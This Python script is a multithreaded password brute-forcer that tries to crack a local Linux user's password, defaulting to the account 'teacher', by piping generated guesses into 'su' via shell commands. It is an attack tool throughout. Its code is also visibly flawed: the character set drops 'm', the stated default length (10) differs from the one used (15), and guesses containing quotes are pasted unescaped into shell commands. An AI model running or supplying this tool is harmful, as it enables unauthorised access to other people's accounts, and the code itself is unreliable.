import os, time, threading
    
chars = '0123456789abcdefghijklnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@"#$%^&*()-_=+\\/<>,.";:'
threads = []

class StoppableThread(threading.Thread):
    def __init__(self,  *args, **kwargs):
        super(StoppableThread, self).__init__(*args, **kwargs)
        self._stop_event = threading.Event()

    def stop(self):
        self._stop_event.set()

    def stopped(self):
        return self._stop_event.is_set()

def stopAllThreads():
    for thread in threads:
        thread.stop()

def main():
    user = input('Choose user [teacher]:\n> ')
    user = 'teacher' if user == "" else user
    length = input('Choose password length [10]:\n> ')
    length = 15 if length == "" else int(length)
    threadsCount = input('Choose threads count [4]:\n> ')
    threadsCount = 4 if threadsCount == "" else int(threadsCount)
    if threadsCount >= len(chars):
        threadsCount = len(chars)
        print(f'We don\'t want your PC to explode. Will be used {threadsCount} threads')

    global threads
    for i in range(threadsCount):
        threads.append(StoppableThread(target=brute, args=(user, length, threadsCount, [i])))

    for thread in threads:
        thread.start()

    global t1
    t1 = time.time()

def getPasswdByCharList(charlst):
    return ''.join([chars[i] for i in charlst])

def brute(user, length, delta=1, startFrom=[0]):
    charlst = [0] * (length - len(startFrom)) + startFrom
    passwd = getPasswdByCharList(charlst)

    while True:
        passwd = getPasswdByCharList(charlst)
        dwssap = passwd[::-1] # reverse
        if os.system(f'echo "{passwd}" | su {user} -c "whoami"') == 0:
            os.system('clear')
            print(f'==> DONE! PASSWORD FOUND!')
            print(f'    YOUR PASS IS: {passwd}')
            print(f'Bruteforce took {int(time.time()-t1)} sec of your time')
            stopAllThreads()
        else:
            print(f'| Bad luck with {passwd}\n')
            result = generateNextPasswd(charlst, delta)
            if result == True:
                break
            else:
                charlst = result
        if os.system(f'echo "{dwssap}" | su {user} -c "whoami"') == 0:
            os.system('clear')
            print(f'==> DONE! PASSWORD FOUND!')
            print(f'    YOUR PASS IS: {dwssap}')
            print(f'Bruteforce took {int(time.time()-t1)} sec of your time')
            stopAllThreads()
        else:
            print(f'| Bad luck with {dwssap}\n')

    print('=> BRUTE THREAD ENDED, PASSWORD NOT FOUND')
    print(f'   Maybe wrong password length. Thread settings: delta={delta}, startFrom={startFrom}')

def hasInvalid(charlst):
    for i in charlst:
        if i >= len(chars):
            return True
    return False

def mayIncrement(charlst, delta):
    s = sum([len(chars) - 1 - i for i in charlst])
    return s >= delta

def generateNextPasswd(charlst, delta):
    if not mayIncrement(charlst, delta):
        return True
    for i in range(len(charlst) - 1, -1, -1):
        if charlst[i] < len(chars) - 1: # increment
            charlst[i] += delta
            break
    while hasInvalid(charlst):
        for i in range(len(charlst) - 1, -1, -1):
            if charlst[i] >= len(chars): # invalid value case
                nextItem = i - 1 if i != 0 else len(chars) - 1
                charlst[nextItem] += charlst[i] - (len(chars) - 1)
                charlst[i] -= len(chars) - 1
    return charlst

if __name__ == "__main__":
    main()
